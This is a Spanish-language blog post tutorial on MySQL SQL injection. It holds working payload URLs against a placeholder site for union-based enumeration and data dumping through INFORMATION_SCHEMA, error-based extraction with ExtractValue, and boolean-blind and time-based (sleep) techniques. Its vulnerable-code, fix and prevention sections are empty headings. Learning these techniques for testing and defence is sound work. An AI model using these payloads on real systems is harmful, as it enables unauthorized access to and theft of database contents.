@@ -1,0 +1,717 @@
+---
+layout: post
+title:  "Inyecciones SQL"
+date:   2022-01-31 16:30 -0200
+fecha:	31/01/2022
+hora:	'16:30'
+categories: blog
+---
+
+Las inyecciones SQL se dan exclusivamente en las bases de datos y, por lo general, desde las aplicaciones web.
+
+Puede darse en cualquier base de datos, pero las más comunes se dan en aquellas que pertenecen al Relational 
+Database Management System (RDBMS) llamado "MySQL". Por esto mismo ahondaré en las técnicas que giran entorno a este RDBMS.
+
+<!--more-->
+
+<br>
+
+---
+
+<br>
+
+<div id="toc_container">
+<p class="toc_title">Tabla de Contenidos</p>
+<ul class="toc_list">
+  <li><a href="#basics">Basics</a></li>
+  <li><a href="#proc">Procedimiento</a></li>
+  <li><a href="#si">Distintas formas y técnicas de ejecución</a></li>
+  <li><a href="#vuln">Código vulnerable</a></li>
+  <li><a href="#sol">Solución</a></li>
+  <li><a href="#prev">Prevención</a></li>
+  <li><a href="#prac">¿Dónde practicar?</a></li>
+  <li><a href="#ej">Ejemplos prácticos</a></li>
+</ul>
+</div>
+
+<br>
+
+---
+
+<h2> Basics </h2>
+
+<h3 id="what"> ¿Qué es? </h3>
+La vulnerabilidad SQL Injection es una de tipo, como su nombre lo dice, de inyección de codigo. (Qué son las vulnerabilidad de inyección de código?)
+
+<br>
+
+<h3 id="howv2"> ¿Cómo se ejecuta? </h3>
+
+---
+
+La ejecucion se efectua ingresando codigo de la base de datos en algun input con el objetivo de manipular el funcionamiento del backend.
+
+<br>
+
+<h3 id="where"> ¿Dónde se da? </h3>
+
+---
+
+Se da, por lo general, en las aplicaciones web.
+Especificamente, se da en aquellas funciones de la aplicación que acepten el input del usuario.
+
+<br>
+
+<h3 id="why??"> ¿Por qué surge? </h3>
+
+---
+
+Surge debido a una mala sanitización del código del archivo que recibe el valor del input del usuario y, que al mismo tiempo envía una consulta a la base de datos, lo que permite que este usuario pueda manipular dicha consulta
+y hacer lo que se le venga en gana, como visualizar, modificar o eliminar cualquier valor. Ej: Ver bases de datos, tablas, usuarios, contraseñas, tarjetas de crédito y un largo, largo etcétera.
+
+---
+
+<br>
+<h3 id="proc"> Procedimiento </h3>
+
+---
+
+El procedimiento suele ser el siguiente:
+1. Analizar en dónde se están realizando las consultas a la base de datos.
+2. Detectar la vulnerabilidad.
+3. Averiguar la cantidad de columnas de la tabla.
+4. Visualizar las bases de datos.
+5. Visualizar las tablas.
+6. Visualizar las columnas.
+7. Dumpear la información.
+
+------------
+
+Ejemplos que usaré de aquí en adelante.
+
+Base de datos: "epic_database"
+
+Tabla: "galeria"
+
+URL:
+<pre><a class="ej">http://pagina.com/galeria.php?id=1</a></pre>
+
+Supongamos que esta página está haciendo una consulta, a la base de datos, que se ve más o menos así:
+```
+ SELECT * FROM galeria WHERE id = 1;
+```
+<br>
+
+------------
+
+<br>
+<h4> 1. Analizar en dónde se están realizando las consultas a la base de datos </h4>
+
+Se trata de ver en qué parte de la página web se podrían estar realizando dichas consultas.
+
+**Ejemplos:**
+* Paneles de logueo
+* Paneles de registro
+* Paneles de búsquedas.
+
+**Analizar la URL siempre es algo informativo.**
+
+<br>
+
+---
+
+<br>
+<h4> 2. Detectar la vulnerablidad </h4>
+
+Para detectarla se suele tratar de romper la sintaxis, modificando la query.
+Se lo suele hacer a través de comillas, operaciones lógicas/aritméticas y/o comentarios.
+
+<br>
+
+<font style="color:green" size="4">Comillas </font>
+Es lo que más rompe la sintaxis.
+No importa si la query está solicitando una cadena o un entero. Las comillas siempre rompen la sintaxis, en caso de que el código no esté sanitizado.
+
+**Ejemplos**
+
+* Comillas simples: '
+
+* Comillas dobles: "
+
+* Backticks: `
+
+**Payload:**
+
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">(comillas)</font></a>
+
+<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">'</font></a>
+</pre>
+
+**Consulta:**
+
+```
+SELECT * FROM galeria WHERE id = 1';
+```
+
+Devuelve un error como el siguiente:
+
+<kbd class="highlight">
+ERROR: Could not able to execute SELECT * FROM galeria WHERE id = 1<font class="bordo">'</font>;. You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '<font class="bordo">'</font>' at line 1 
+</kbd>
+
+Lo que sucede es que la base de datos espera una petición cuyo valor sea un entero (en este caso 1) y, al recibir algo distinto (1'), se produce un error y no puede continuar con la operación, debido al
+uso de una sintaxis inválida.
+
+¿Qué es lo que se espera?
+Un error que puede ser en forma de:
+* Error directo de la base de datos.
+* Comportamiento inusual de la página en cuestión.
+
+<br>
+<font style="color:green" size="4">Comentarios</font>
+
+Por lo general, los comentarios son utilizados luego de las comillas o las operaciones lógicas.
+
+El objetivo de inyectar comentarios es anular los comandos que le sigan a la consulta manipulada.
+
+**Ejemplos:**
+
+* <p> -- comentario (nótese el espacio en blanco luego de los guiones, es importante) </p>
+
+* <p>#comentario</p>
+
+* <p>/*comentario*/</p>
+
+**Payload:**
+
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">(operaciones)(comentario)</font></a>
+</pre>
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">OR 1=1;#</font></a>
+</pre>
+<br>
+
+<font style="color:green" size="4">Operaciones lógicas</font>
+Lo que se busca con las operaciones lógicas es ver si se ejecutan.
+
+Si se ejecutan, la consulta sigue normalmente. Si no se ejecutan, saldrá un error (debido a una sanitización).
+
+* Son utilizadas para mostrar información oculta o hacer un bypass a un panel de logueo.
+
+**Ejemplo:**
+
+* OR 1=1
+
+**Payload:**
+
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">(operación)</font></a>
+</pre>
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">OR 1=1</font></a>
+</pre>
+
+**Consulta:**
+
+Hagamos de cuenta que la web hace una consulta a la base de datos estrictamente sobre obras de arte que ya salieron a la vista del público, así ocultando aquellas que todavía estén en producción.
+Lo cual se vería así:
+```
+SELECT * FROM galeria WHERE id = 1 AND status = "publica";
+```
+
+Si un usuario manipulara la consulta a la base de datos e inyectara código malicioso podría ver aquellas obras que aún no están a la vista del público ya que no se ejecutaría la parte que impide que se
+muestren dichas obras.
+
+En tal caso, el payload:
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">OR 1=1;#</font></a>
+</pre>
+
+Mandaría a la base de datos la siguiente consulta:
+
+<pre class="highlight">
+SELECT * FROM galeria WHERE id = 1 <font class="bordo">OR 1=1;#</font> AND status = "publica";
+</pre>
+
+Lo que devolvería tanto las obras públicas como las que aún están en producción, ya que no se valida la parte de la consulta que se encarga de que eso no suceda.
+
+¿Por qué?
+
+Porque se están consultando aquellas obras de arte cuya id sea 1 **o** 1=1, lo cual es una sentencia que devuelve **True**. Por ende, la base de datos devuelve las obras
+cuya id sea 1 o **True**. Esto significa que devolverá cualquier obra que tenga asignado algún valor en la columna 'id'.
+
+<br>
+
+<font style="color:green" size="4"> Procedimiento </font>
+
+Una especie de metodología (?) que me armé cuando estaba practicando esta vulnerabilidad.
+
+1. Testear lógica.
+
+2. Intentar romper sintaxis.
+
+3. Probar con cada forma de hacer comentarios.
+
+***El tema es que si algo cambia, si algo se rompe o incluso cuando no, es muy probable que exista la vulnerabilidad.***
+
+<br>
+
+---
+
+<br>
+<h4> 3. Averiguar la cantidad de columnas de la tabla </h4>
+Se busca, básicamente, saber exactamente cuantas columnas hay en la tabla que se está consultando.
+
+Esto se logra a traves de comandos de MySQL que se deben inyectar.
+
+Estos comandos son ORDER BY y UNION SELECT.
+
+<br>
+<h5> ORDER BY </h5>
+Permite saber el límite de columnas que hay en la tabla.
+No genera ningún output al ejecutar el comando exitosamente (ordenar columnas existentes), el output se genera en forma
+de error cuando se intenta "ordenar" columnas cuyo límite ya fue alcanzado.
+
+* Básicamente, si se intenta "ordenar" a las columnas por una cantidad mayor de las que existen, tira error. Y ese error es lo que
+permite saber el límite de columnas.
+
+* Se debe ir probando hasta alcanzar el límite de columnas.
+
+**Ejemplo:**
+
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 OR 1=1 ORDER BY 4;#</a>
+</pre>
+
+Anotación:
+
+**Es importante saber el número exacto de columnas ya que de otra forma no se podrá continuar.**
+
+<br>
+<h5> UNION SELECT </h5>
+Permite listar las columnas, de fórma simbólica. Es decir, cada columna toma el valor de un número (o lo que se quiera poner en su lugar).
+Esto sirve para poder listar otro tipo de información como el nombre de las bases de datos, de las tablas y demás. Yo lo veo como si fueran recipientes.
+
+* Se lista el número máximo de columnas.
+* Sin este comando no se puede seguir con el procedimiento. Es fundamental.
+
+**Ejemplo:**
+
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 OR 1=1 UNION SELECT 1,2,3,4;#</a>
+</pre>
+
+Anotación:
+**Se debe listar por la cantidad máxima de columnas, ni más ni menos. Si no se lo hace así dará error.**
+
+<br>
+
+
+---
+
+<br>
+<h4> 4. Visualizar las bases de datos </h4>
+A partir de acá se utilizan los llamados "metadatos" para listar información que de otra manera no sería visible.
+
+Estos metadatos contienen la información de prácticamente todo, lo que incluye a las bases de datos, tablas,
+columnas, etc.
+
+* Solo proveen acceso de lectura, lo cual significa que no se puede ejecutar ningún comando como INSERT, UPDATE o DELETE.
+
+* Son estándares que siempre existen dentro de una base de datos de MySQL.
+
+* Los metadatos se guardan en una base de datos particular llamada "INFORMATION_SCHEMA".
+
+* Se utiliza una forma alternativa de seleccionar los datos de una tabla (o al menos para mí lo es).
+> <font class="highlight" size="2">SELECT (columna) FROM (database).(tabla)</font><br><font size="2">Te permite seleccionar el valor de una columna de una tabla de una base de datos, sin importar si estás o no utilizando esa base de datos. </font>
+
+Esquemas utilizados:
+
+* INFORMATION_SCHEMA (database)
+><font size="2">Base de datos que contiene los metadatos. </font>
+
+* SCHEMATA (tabla)
+><font size="2">Tabla perteneciente a la base de datos "INFORMATION_SCHEMA" que contiene información de todas las bases de datos. </font>
+
+* SCHEMA_NAME (columna)
+><font size="2">Columna perteneciente a la tabla "SCHEMATA" que guarda el nombre de todas las bases de datos. </font>
+
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 UNION SELECT 1,SCHEMA_NAME,3 FROM INFORMATION_SCHEMA.SCHEMATA;#</a>
+</pre>
+
+_"Seleccionar los datos de la columna 'SCHEMA_NAME' de la tabla 'SCHEMATA' cuya base de datos es 'INFORMATION_SCHEMA'"_
+
+**Es lo mismo que ejecutar lo siguiente en la consola de MySQL:**
+
+``` 
+show databases; 
+```
+<br>
+
+---
+
+<br>
+<h4> 5. Visualizar las tablas </h4>
+Mismo procedimiento pero cambian la tabla y columnas de information_schema.
+
+
+* INFORMATION_SCHEMA (database)
+
+* TABLES (tabla)
+> <font size="2"> Tabla que contiene información de todas las tablas de todas las bases de datos.</font>
+
+* TABLE_NAME (columna)
+> <font size="2"> Columna que guarda el nombre de todas las tablas de todas las bases de datos. </font>
+
+* TABLE_SCHEMA (columna)
+> <font size="2"> Columna que contiene el nombre de la base de datos a la que pertenece x tabla. </font>
+
+**Ejemplo:**
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 UNION SELECT 1,2,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = "epic_database";#</a>
+</pre>
+
+_"Quiero saber el contenido de la columna 'TABLE_NAME' de la base de datos 'INFORMATION_SCHEMA' cuya tabla es 'TABLE_SCHEMA', donde el valor de la 
+columna 'TABLE_SCHEMA' sea 'epic_database'"_
+
+**Es el equivalente a ejecutar lo siguiente en la consola de MySQL:**
+```
+use {base_de_datos};
+
+show TABLES;
+```
+
+***Es preciso especificar el "TABLE_SCHEMA" debido a que de otra forma se mostrarán todos los valores de la columna "TABLE_NAME", lo cual sería un desastre.***
+
+<br>
+
+---
+
+<br>
+<h4> 6. Visualizar las columnas </h4>
+Mismo procedimiento pero cambian la tabla y la columna.
+
+Esquemas utilizados:
+* INFORMATION_SCHEMA (database)
+
+* COLUMNS (tabla)
+> <font size="2"> Tabla que guarda información de todas las columnas de todas las tablas de todas las bases de datos.</font>
+
+* COLUMN_NAME (columna)
+> <font size="2"> Columna que guarda el nombre de todas las columnas de todas las... Ya saben el resto. </font>
+
+* TABLE_NAME (columna)
+> <font size="2"> Columna que guarda el nombre de la tabla a la que pertenece x columna. </font>
+
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 UNION SELECT 1,2,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = "galeria";#</a>
+</pre>
+
+_"Quiero saber los datos de la columna 'COLUMN_NAME', de la tabla 'COLUMNS', cuya base de datos es 'INFORMATION_SCHEMA' y la columna 'TABLE_NAME' tiene el valor de 'galeria'"_
+
+**Es algo parecido a ejecutar:**
+```
+describe galeria;
+```
+
+_Recordar que el 'where' siempre funciona como "guía" para mostrar justamente lo que se quiere saber y evitar mostrar información innecesaria._
+
+<br>
+
+---
+
+<br>
+<h4> 7. Dumpear la información </h4>
+En esta parte ya se muestra la información, pero se sigue utilizando la forma relativa de hacerlo.
+
+Esquemas utilizados:
+* A esta altura ya se sabe todo lo necesario para dumpear la información, por lo que no se hace uso de information_schema.
+
+Funciones utilizadas:
+* concat()
+> <font size="2">Sirve para mostrar el valor de varias columnas en una sola sentencia.</font>
+
+Funciones alternativas:
+* group_concat()
+> <font size="2"></font>
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 UNION SELECT 1,2,concat(id,':',nombre,':',propietario) FROM epic_database.galeria;#</a>
+</pre>
+
+_"Mostrar, de forma concatenada, el valor de la columna 'id', 'nombre' y 'propietario' de la tabla 'galeria' cuya base de datos es 'epic_database'"_
+
+Lo mejor es hacerlo de la forma alternativa de seleccionar la información (como se acaba de mostrar).
+
+**Es parecido a ejecutar lo siguiente en la consola de MySQL:**
+```
+SELECT concat(id,':', nombre,':', propietario) FROM epic_database.galeria;
+```
+<br>
+
+---
+
+<br>
+<h3 id="si"> Distintas formas de ejecutarla </h3>
+
+---
+
+Por lo general, las inyecciones SQL se ejecutan siempre de la misma forma al comienzo. Lo unico que cambia es como se muestra la información en pantalla.
+
+<font syle="color:blue"> ¿A qué me refiero con esto? </font>
+
+No existe una sola forma de detectar y explotar esta vulnerabilidad ya que hay escenarios en los que no es posible visualizar la información deseada o incluso algunos en los que no se ve ninguna información. Es entonces cuando hay que ponerse creativos.
+
+Muy bien, antes de profundizar en las distintas formas de ejecutar esta vulnerabilidad, quisiera nombrar los tipos de Inyección SQL que existen, los cuales son:
+
+* SQL Injection In Band
+	* SQL Injection Union Based
+	* SQL Injection Error Based
+* SQL Injection Inferential
+	* SQL Injection Blind
+	* SQL Injection Time Based 
+* SQL Injection Out Of Band
+
+---
+
+<h4> SQL Injection In Band </h4>
+Las "Inyecciones SQL en banda" o "clásicas" son las más sencillas y, al mismo tiempo, poco probables de ejecutar.
+Se caracterizan por el hecho de que se utiliza el mismo "canal de comunicación" para desplegar el ataque y observar los resultados. Un canal de comunicación sería una página web, por ejemplo.
+
+Coloquialmente, se ve la información en el mismo lugar de la ejecución de la vulnerabilidad.
+
+Básicamente:
+* Se utiliza el mismo canal para ejecutar el ataque y extraer la información.
+* La información es **visible**.
+
+
+<br>
+
+<h5> SQL Union Based </h5>
+Es la técnica que se estuvo mostrando a lo largo de toda esta publicación.
+
+<br>
+
+<h5> SQL Injection Error Based </h5>
+Se da cuando en el output no se muestran más que ***errores***.
+
+En teoría lo que hace esta técnica es, a partir de un error, mostrar información de la base de datos, convirtiendo un valor en otro.
+
+Técnicamente se transforma el valor que genera el error de sintaxis en uno de la base de datos.
+
+* Existen distintas formas de ejecutar este tipo de ataque. No obstante, todas se basan en el mismo principio; listar información a partir de errores.
+
+* Utiliza las funciones:
+	* limit
+	* ExtractValue()
+
+<h6>limit</h6>
+
+<h6>ExtractValue</h6>
+Es una función utilizada para visualizar información de XML en MySQL.
+
+**Uso:**
+ExtractValue(xml_frag, xml_path)
+
+xml_frag = Se especifica el valor que se quiere extraer y dentro de qué tags está.
+
+xlm_path = Es la ruta hacia el valor a extraer. Se la especifica como si fuera la ruta a un archivo en Linux.
+
+Ejemplo:
+```
+SELECT ExtractValue('<tag1><tag2>Valor a extraer</tag2></tag1>', '/tag1/tag2');
+```
+Lo que interesa de esta función es su output al haber un error de sintaxis en el argumento _xml_path_, el cual muestra el valor específico que
+está causando dicho error.
+
+Ejemplo:
+Si yo decidiera, por alguna razón, poner una backtick en el argumento _xml_path_:
+```
+SELECT ExtractValue('<tag1><tag2>Valor a extraer</tag2></tag1>', '`');
+```
+Se generaría un error de sintaxis, que se vería algo así:
+```
+ERROR 1105 (HY000): XPATH syntax error: '`'
+```
+Por ende, si se pudiera concatenar esa backtick a un valor de la base de datos, sería posible visualizarlo.
+Para lograr esto, se hace uso de lo que se conoce como _subquery_.
+
+Las subqueries, básicamente, son cláusulas dentro de otras cláusulas. Para más info, seguir <a href="https://dev.mysql.com/doc/refman/8.0/en/subqueries.html">este link</a>.
+
+Ejemplo: un SELECT dentro de otro SELECT
+```
+SELECT (SELECT @@version);
+```
+El tema ahora es que, al ser una subquery, no puede devolver más de un valor. Es decir, solo puede mostrar una fila o, caso contrario,
+la información no será visible.
+
+En consecuencia, se hace uso de la cláusula _LIMIT_ para visualizar una fila a la vez.
+
+<h6>LIMIT</h6>
+Sirve para limitar el número de filas que se muestran. Se usa en conjunto con la cláusula 'SELECT'.
+
+**Uso:**
+
+Puede aceptar uno o dos argumentos.
+
+LIMIT {indice}, {cantidad}
+
+indice = En qué indice se encuentra la fila a mostrar. 0 es el primero.
+
+cantidad = Número de filas a mostrar.
+
+Ejemplo:
+```
+SELECT * FROM galeria LIMIT 0,1;
+```
+_"Quiero ver toda la información dentro de la tabla 'galeria' pero limitando el output, desde la primer fila, a una sola fila"_
+
+Retomando, si se quisiera concatenar alguna información de la base de datos al error de sintaxis, se utilizaría una consulta como la siguiente:
+<pre class="highlight">
+SELECT ExtractValue('LOL', concat('`', (SELECT schema_name FROM information_schema.schemata LIMIT 1,1)));
+</pre>
+
+Cabe destacar que el valor de _xml_frag_ puede ser enteros o cadenas y aún así la query funcionará.
+
+En el contexto de una inyección, el payload sería el siguiente:
+<pre>
+<a class="ej">http://pagina.com/galeria.php?id=1 AND ExtractValue('LOL', concat('`', (SELECT schema_name FROM information_schema.schemata LIMIT 1,1)));-- c</a>
+</pre>
+
+Notas:
+* La primer base de datos suele ser 'information_schema' en sí, por lo que no tiene mucho sentido apuntar a ella con LIMIT.
+* Muchas veces es necesario hacer uso de caracteres en hexadecimal en el argumento _xml_path_, específicamente en la concatenación. Es decir, en vez de usar '`', se usa su forma hexadecimal; 0x60. Esto se hace cuando el código sanitiza el uso de las comillas.
+* Es recomendable utilizar el Intruder de la herramienta Burpsuite debido a que se deben enviar muchos payloads.
+* ExtractValue() tiene un límite de 20 bytes que puede extraer, por lo que, si se quiere ver algo más grande que eso, se tiene que utilizar el método de la cláusula "SELECT".
+
+<a href="#error_based_example">Ejemplo práctico</a> de la técnica.
+
+Este <a href="https://www.rafaybaloch.com/2017/06/error-based-sql-injection-tricks-in.html">post</a> y <a href="https://websec.ca/kb/sql_injection">este otro</a> me ayudaron bastante a entender esta variación. Recomiendo su lectura ya que allí se muestran otras formas de ejecutar este tipo de ataque.
+
+---
+
+
+
+<h4> SQL Injection Inferential </h4>
+Se da cuando no hay forma de ver el resultado del ataque.
+
+En este tipo de inyección, se recurre a los *condicionales* y al *tiempo de respuesta* para saber si las consultas son exitosas o no.
+
+* La información ***no es visible***.
+
+<br>
+
+<h5> SQL Injection Boolean Based </h5>
+
+Es completamente a ciegas. Se basa en que, si una query es acertada no se generan errores, pero si es errónea si se generarán. A partir de eso es que se trata de "adivinar" información de la base de datos. Es un proceso bastante tardío.
+
+* Los errores suelen ser cualquier cosa menos errores mostrados por la base de datos.
+	* Ej: páginas 404, partes de la página que no se muestran, páginas en blanco, etc. Cualquier comportamiento inusual, básicamente.
+
+* Recordar:
+	* Si la página carga bien = Consulta exitosa.
+	* Si se produce algo inusual = Consulta no exitosa.
+
+* Se suele utilizar la función substring()
+
+* Se hace uso de los condicionales y el operador AND.
+
+<br>
+<h5>Función substring()</h5>
+Permite extraer caracteres de una string (palabra).
+
+**Uso:**
+
+<kbd>substring({target}, {inicio}, {caracteres})</kbd>
+
+target = Objetivo de la función.
+
+inicio = Desde dónde se comienza la extracción de caracteres. 1 es el primer caracter.
+
+caracteres = Cantidad de caracteres a extraer.
+
+**Ejemplo:**
+
+```
+SELECT substring(database(),1,1)
+```
+_"Del nombre de la base de datos actual extraer, a partir del primer caracter, un caracter."_
+
+<br>
+**Ejemplo práctico:**
+
+Base de datos: epic_database
+
+<pre><a class="ej">http://pagina.com/galeria.php?id=5 <font class="bordo">AND substring(database(),1,1)>'a';#</font></a></pre>
+"¿Es el primer caracter, del nombre de la base de datos actual, mayor a la letra 'a'?"
+Falso
+<pre><a class="ej">http://pagina.com/galeria.php?id=5 AND substring(database(),1,1)>'d';#</a></pre>
+"¿Es el primer caracter, del nombre de la base de datos actual, mayor a la letra 'd'?"
+Falso
+<pre><a class="ej">http://pagina.com/galeria.php?id=5 AND substring(database(),1,1)>'f';#</a></pre>
+"¿Es el primer caracter, del nombre de la base de datos actual, mayor a la letra 'f'?"
+Falso
+<pre><a class="ej">http://pagina.com/galeria.php?id=5 AND substring(database(),1,1)<'g';#</a></pre>
+"¿Es el primer caracter, del nombre de la base de datos actual, menor a la letra 'g'?"
+Falso
+<pre><a class="ej">http://pagina.com/galeria.php?id=5 AND substring(database(),1,1)='e';#</a></pre>
+"¿Es el primer caracter, del nombre de la base de datos actual, igual a la letra 'e'?"
+Verdadero
+
+Recordemos el funcionamiento del operador AND:
+
+"Si esto **Y** esto otro es verdadero, **ENTONCES** va a pasar algo".
+
+Contrario al operador OR:
+
+"Si esto **O** esto otro es verdadero, **ENTONCES** va a pasar algo."
+
+**Notas:**
+* El intruder de Burp Suite es algo que se tiene que usar sí o sí en esta técnica. La extensión Turbo Intruder también es una buena idea. Eso o usar sqlmap.
+
+<a href="#boolean">Ejemplo práctico</a> de la técnica.
+
+<br>
+<h5> SQL Injection Time Based </h5>
+
+Saber el nombre de la base de datos.
+
+<pre><a class="ej"> 1 AND IF((substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1) > 'a', sleep(10), NULL)</a>2</pre>
+
+<br>
+
+<h4> SQL Injection Out of Band </h4>
+
+---
+
+<br>
+
+<h3 id="vuln"> Código vulnerable </h3>
+
+---
+
+<br>
+
+<h3 id="sol"> Solución </h3>
+
+---
+
+<br>
+
+<h3 id="prev"> Cómo prevenirla </h3>
+
+---
+
+<br>
+
+<h3 id="ej"> Ejemplos prácticos </h3>
+
+Union Based
+
+Error Based
+
+Boolean Based
+
+Time Based
